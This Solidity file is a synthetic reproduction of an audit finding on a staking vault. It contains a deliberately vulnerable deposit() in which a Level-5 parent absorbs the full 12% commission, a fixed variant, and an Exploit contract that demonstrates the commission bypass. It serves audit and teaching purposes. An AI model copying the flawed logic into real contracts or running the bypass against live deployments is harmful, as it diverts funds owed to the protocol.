// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Terplayer (BVT Staking&Distribution)
// finding 62639 [H-01]:
// "Users with Level 5 Account May Bypass the Applied 12% Commissions".
//
// BvtRewardVault.deposit() distributes a mandatory commission on every deposit.
// It walks the caller's chain of commission parents and, for each parent, credits
// that parent `commission - totalHigherLevelCommissionAmountRate` (a share of the
// deposit) and then RAISES the running accumulator
// `totalHigherLevelCommissionAmountRate` to that parent's commission rate. AFTER
// the loop, the protocol's own `recipientComission` is credited the RESIDUAL:
// `getTotalCommission() - totalHigherLevelCommissionAmountRate`.
//
// The mandatory rate a Level-5 account owes (getTotalCommission() == 1200 bp,
// i.e. 12%) equals the per-parent commission a Level-5 parent receives
// (getCommission(5) == 1200 bp). So a Level-5 user who attaches a FRESH child
// account directly to their OWN Level-5 parent makes the child's deposit route
// the entire 12% to that attacker-controlled parent. The loop then leaves the
// accumulator at 1200, so the residual `1200 - 1200 == 0` and the guard
// `totalCommissionAmountRate > totalHigherLevelCommissionAmountRate` is FALSE —
// the protocol's `recipientComission` is credited NOTHING. The protocol is
// robbed of the commission it should collect; the attacker keeps it.
//
// The two commission-distribution blocks below (the parent loop + the
// recipientComission residual block) are inlined VERBATIM from the finding's
// deposit() snippet. The `// @>` marker sits on the exact defective line.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC20 double. Used ONLY as a measurement marker that records the
///      commission diverted away from the protocol to the attacker's parent.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Faithful minimal double for the bond-dealer commission schedule.
///      A Level-5 account's per-parent commission equals the total mandatory
///      commission (12%), which is exactly what enables the bypass.
interface IBondDealer {
    function getCommission(uint256 level) external view returns (uint256);
    function getTotalCommission() external view returns (uint256);
}

contract BondDealerDouble is IBondDealer {
    // Per-level commission rate in basis points.
    function getCommission(uint256 level) external pure returns (uint256) {
        if (level >= 5) return 1200; // Level 5 → full 12%
        if (level == 4) return 1000; // Level 4 → 10%
        if (level == 3) return 800;
        if (level == 2) return 500;
        return 200;
    }

    // Total mandatory commission every account owes = 12%.
    function getTotalCommission() external pure returns (uint256) {
        return 1200;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract. The commission-distribution blocks inside deposit() are
// inlined VERBATIM from the finding (imports/pragma stripped only).
// ─────────────────────────────────────────────────────────────────────────────
contract BvtRewardVault {
    uint256 internal constant MAX_COMMISSION_RATE = 10000;

    struct UserInfo {
        address user;
        uint8 level;
    }

    IBondDealer public bondDealerContract;
    address public recipientComission;

    // The caller's chain of commission parents (its account hierarchy).
    mapping(address => UserInfo[]) internal parents;

    // Internal delegated-stake accounting credited by _delegateStake.
    mapping(address => uint256) public delegatedStake;
    mapping(address => mapping(address => bool)) public isUserInDelegatedStakeList;
    mapping(address => address[]) public delegatedStakeUsers;

    uint256 private _reentrancyLock;
    modifier nonReentrant() {
        require(_reentrancyLock == 0, "reentrant");
        _reentrancyLock = 1;
        _;
        _reentrancyLock = 0;
    }

    constructor(address _bondDealer, address _recipientComission) {
        bondDealerContract = IBondDealer(_bondDealer);
        recipientComission = _recipientComission;
    }

    /// @notice Attach a commission parent to the caller's account hierarchy.
    function addCommissionParent(address parent, uint8 level) external {
        parents[msg.sender].push(UserInfo({user: parent, level: level}));
    }

    /// @notice Faithful minimal double for the internal delegated-stake credit.
    function _delegateStake(address from, address to, uint256 amount) internal {
        from; // the depositor; unused in this reduction
        delegatedStake[to] += amount;
    }

    function deposit(uint256 amount) external nonReentrant {
        uint256 userAmount = amount;
        uint256 totalHigherLevelCommissionAmountRate = 0;
        UserInfo[] memory commissionParents = parents[msg.sender];

        // code
        for (uint256 i = 0; i < commissionParents.length; i++) {
            UserInfo memory parentInfo = commissionParents[i];
            if (parentInfo.user == address(0)) {
                continue;
            }
            uint256 commission = bondDealerContract.getCommission(
                uint256(parentInfo.level)
            );

            uint256 commissionAmount = (amount *
                (commission - totalHigherLevelCommissionAmountRate)) / 10000;
            if (commissionAmount > 0) {
                if (!isUserInDelegatedStakeList[msg.sender][parentInfo.user]) {
                    isUserInDelegatedStakeList[msg.sender][
                        parentInfo.user
                    ] = true;
                    delegatedStakeUsers[msg.sender].push(parentInfo.user);
                }
                _delegateStake(msg.sender, parentInfo.user, commissionAmount);
                userAmount -= commissionAmount;
                totalHigherLevelCommissionAmountRate = commission; // @> a Level-5 parent whose getCommission(5)==getTotalCommission() raises the accumulator to the full 12%, collapsing the recipientComission residual to 0
            }
        }

        if (recipientComission != address(0)) {
            uint256 totalCommissionAmountRate = bondDealerContract
                .getTotalCommission();
            if (
                totalCommissionAmountRate > totalHigherLevelCommissionAmountRate
            ) {
                uint256 recipientCommissionAmount = (amount *
                    (totalCommissionAmountRate -
                        totalHigherLevelCommissionAmountRate)) /
                    MAX_COMMISSION_RATE;
                if (
                    !isUserInDelegatedStakeList[msg.sender][recipientComission]
                ) {
                    isUserInDelegatedStakeList[msg.sender][
                        recipientComission
                    ] = true;
                    delegatedStakeUsers[msg.sender].push(recipientComission);
                }
                _delegateStake(
                    msg.sender,
                    recipientComission,
                    recipientCommissionAmount
                );
                userAmount -= recipientCommissionAmount;
            }
        }
        // code

        // The depositor stakes the remainder to themselves.
        _delegateStake(msg.sender, msg.sender, userAmount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract: implements the auditor's recommendation — "Don't allow new
// accounts to directly attach to Level 5 accounts." A fresh child attaching
// directly to a Level-5 parent (which would absorb the full mandatory
// commission and zero the protocol's share) is rejected. Legitimate hierarchies
// distribute the commission normally and the protocol's residual is credited.
// ─────────────────────────────────────────────────────────────────────────────
contract BvtRewardVaultFixed {
    uint256 internal constant MAX_COMMISSION_RATE = 10000;

    struct UserInfo {
        address user;
        uint8 level;
    }

    IBondDealer public bondDealerContract;
    address public recipientComission;

    mapping(address => UserInfo[]) internal parents;
    mapping(address => uint256) public delegatedStake;
    mapping(address => mapping(address => bool)) public isUserInDelegatedStakeList;
    mapping(address => address[]) public delegatedStakeUsers;

    uint256 private _reentrancyLock;
    modifier nonReentrant() {
        require(_reentrancyLock == 0, "reentrant");
        _reentrancyLock = 1;
        _;
        _reentrancyLock = 0;
    }

    constructor(address _bondDealer, address _recipientComission) {
        bondDealerContract = IBondDealer(_bondDealer);
        recipientComission = _recipientComission;
    }

    function addCommissionParent(address parent, uint8 level) external {
        parents[msg.sender].push(UserInfo({user: parent, level: level}));
    }

    function _delegateStake(address from, address to, uint256 amount) internal {
        from;
        delegatedStake[to] += amount;
    }

    function deposit(uint256 amount) external nonReentrant {
        uint256 userAmount = amount;
        uint256 totalHigherLevelCommissionAmountRate = 0;
        UserInfo[] memory commissionParents = parents[msg.sender];

        // FIX: reject a fresh account that directly attaches to a Level-5
        // parent, which would let the parent absorb the full mandatory
        // commission and rob the protocol of its share.
        for (uint256 i = 0; i < commissionParents.length; i++) {
            require(
                commissionParents[i].level < 5,
                "cannot directly attach to a Level-5 account"
            );
        }

        for (uint256 i = 0; i < commissionParents.length; i++) {
            UserInfo memory parentInfo = commissionParents[i];
            if (parentInfo.user == address(0)) {
                continue;
            }
            uint256 commission = bondDealerContract.getCommission(
                uint256(parentInfo.level)
            );

            uint256 commissionAmount = (amount *
                (commission - totalHigherLevelCommissionAmountRate)) / 10000;
            if (commissionAmount > 0) {
                if (!isUserInDelegatedStakeList[msg.sender][parentInfo.user]) {
                    isUserInDelegatedStakeList[msg.sender][parentInfo.user] = true;
                    delegatedStakeUsers[msg.sender].push(parentInfo.user);
                }
                _delegateStake(msg.sender, parentInfo.user, commissionAmount);
                userAmount -= commissionAmount;
                totalHigherLevelCommissionAmountRate = commission;
            }
        }

        if (recipientComission != address(0)) {
            uint256 totalCommissionAmountRate = bondDealerContract.getTotalCommission();
            if (totalCommissionAmountRate > totalHigherLevelCommissionAmountRate) {
                uint256 recipientCommissionAmount = (amount *
                    (totalCommissionAmountRate - totalHigherLevelCommissionAmountRate)) /
                    MAX_COMMISSION_RATE;
                if (!isUserInDelegatedStakeList[msg.sender][recipientComission]) {
                    isUserInDelegatedStakeList[msg.sender][recipientComission] = true;
                    delegatedStakeUsers[msg.sender].push(recipientComission);
                }
                _delegateStake(msg.sender, recipientComission, recipientCommissionAmount);
                userAmount -= recipientCommissionAmount;
            }
        }

        _delegateStake(msg.sender, msg.sender, userAmount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: a Level-5 user attaches a fresh child (this contract) directly
// to their own attacker-controlled Level-5 parent, deposits, and the entire 12%
// mandatory commission is routed to the attacker parent while the protocol's
// recipientComission receives 0.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    // The attacker-controlled Level-5 parent (also the attacker EOA the harm is
    // measured against).
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    // The protocol's mandatory-commission recipient.
    address internal constant RECIPIENT_COMMISSION = 0x000000000000000000000000000000000000c0Fe;

    uint256 internal constant DEPOSIT = 10_000 ether; // 10000 units
    uint256 internal constant COMMISSION = 1_200 ether; // 12% of the deposit

    // Exposed results.
    uint256 public attackerParentStake;
    uint256 public recipientStake;
    uint256 public attackerMarkerBalance;
    address public vaultAddr;
    address public markerAddr;

    function run() external payable {
        // --- deploy the real vulnerable vault + its commission schedule ---
        BondDealerDouble bd = new BondDealerDouble();                        // deploy 0
        BvtRewardVault vault = new BvtRewardVault(address(bd), RECIPIENT_COMMISSION); // deploy 1
        MiniToken marker = new MiniToken("Stolen Commission", "STOLEN-COMM");        // deploy 2

        vaultAddr = address(vault);
        markerAddr = address(marker);

        // --- malicious hierarchy: fresh child attaches directly to its own
        //     Level-5 parent (attacker-controlled) ---
        vault.addCommissionParent(ATTACKER, 5);

        // --- the fresh child (this Exploit) deposits its whole balance ---
        vault.deposit(DEPOSIT);

        attackerParentStake = vault.delegatedStake(ATTACKER);
        recipientStake = vault.delegatedStake(RECIPIENT_COMMISSION);

        // --- HARM: the Level-5 parent absorbed the full 12%; the protocol's
        //     recipientComission got nothing ---
        require(attackerParentStake == COMMISSION, "parent did not absorb full commission");
        require(recipientStake == 0, "protocol commission was not zeroed");

        // --- record the diverted commission as a measurable asset at the attacker ---
        marker.mint(ATTACKER, attackerParentStake);
        attackerMarkerBalance = marker.balanceOf(ATTACKER);
    }
}
